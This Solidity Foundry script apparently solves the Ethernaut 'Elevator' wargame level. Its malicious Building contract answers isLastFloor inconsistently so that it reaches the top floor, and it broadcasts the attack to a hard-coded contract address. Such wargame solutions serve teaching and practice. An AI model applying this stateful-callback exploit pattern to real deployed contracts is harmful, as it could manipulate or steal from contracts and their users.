// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {Elevator} from "../src/Elevator.sol";

contract Building {
    bool public counter;
    Elevator public elevator = Elevator(0xC481419d842793783AEb7C39924667B2c703D097);

    function startAttack() external {
        elevator.goTo(1);
    }

    function isLastFloor(uint256) external returns (bool) {
        if (!counter) {
            counter = true;
            return false;
        } else {
            return true;
        }
    }
}

contract ElevatorSolution is Script {
    Building public building;

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        building = new Building();
        building.startAttack();
        console.log("I exploited to top floor: ", building.counter());
        vm.stopBroadcast();
    }
}
